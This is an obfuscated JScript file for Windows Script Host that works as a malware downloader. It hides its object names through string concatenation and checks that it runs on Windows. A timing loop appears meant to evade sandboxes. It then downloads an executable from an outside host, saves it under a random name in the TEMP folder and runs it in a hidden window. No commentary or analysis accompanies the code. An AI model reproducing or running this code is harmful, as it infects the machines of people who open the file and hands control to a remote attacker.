var GD = false;
var QH = "Create"+"Object";
var E0 = function J() {return WScript[QH]("WScript"+".Shell");}(), H = 11;
var V = "MSXML2"+".XMLHTTP";
var MG = 2;
var LP = MG - 2;
function LS(W1){E0["Run"](W1, LP, LP);};
function GZ(){return V + "";};
function BL(GU, XW){LP = LP * 1; return GU - XW;};
function KY(){return QH;};
/*@cc_on
  @if (@_win32 || @_win64)
    GD = true;
  @end
@*/
if (GD)
{
var L = "";
function W(){return 22;};
var BU = 0; var LF = 0;
function CH()
{
var R = new this["Date"]();
var NU = R["getUTCMilliseconds"]();
WScript["Sleep"](W());
var R = new this["Date"]();
var QA = R["getUTCMilliseconds"]();
WScript["Sleep"](W());
var R = new this["Date"]();
var U = R["getUTCMilliseconds"]();
var BU = "D";
BU = BL(QA, NU);
var LF = "RD";
LF = BL(U, QA);
L = "open";
return BL(BU, LF);
}
var L0 = false;
var XM = false;
for (var LS0 = LP; LS0 < W() * 1; LS0++){if (CH() != LP){
L0 = true; 
LF = "31" + 11 * BU + LF; 
XM = true; 
break;
}}
function Y() {return ((L0 == true) && (L0 == XM)) ? 1 : LP;};
if (L0 && Y() && XM){
function NX() {return E0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "GZ8tZ7IxacGIzS.ex" + "e";};
 S = GZ();
 JM = WScript[QH](S);
 var OG = 1;
do { 
	for (;OG;){
	try {
		if (OG == 1)
		{
			JM[L]("GET", "http://greenbee.com.ua/b7eosa", false);
			JM["send"]();
			W0 = "Sleep";
			OG = 2;
		}
		WScript[W0](W() + 120); 
		if (JM["readystate"] < 2 * 2) continue;
		OG = LP;
		function E(RY) {var VB = (1, 2, 3, 4, 5, RY); return VB;};
		LG = WScript[KY()]("ADODB.Stream");
		S = LG;
		S[L]();
		S["type"] = E(1);
		S["write"](JM["ResponseBody"]);
		LG["position"] = E(LP);
		S["Save" + "ToFile"](NX(), 2);
		LG["cl"+"ose"]();
		GT = NX();
		LS(GT);
	} catch(J0){};};
}while (OG);
}
}

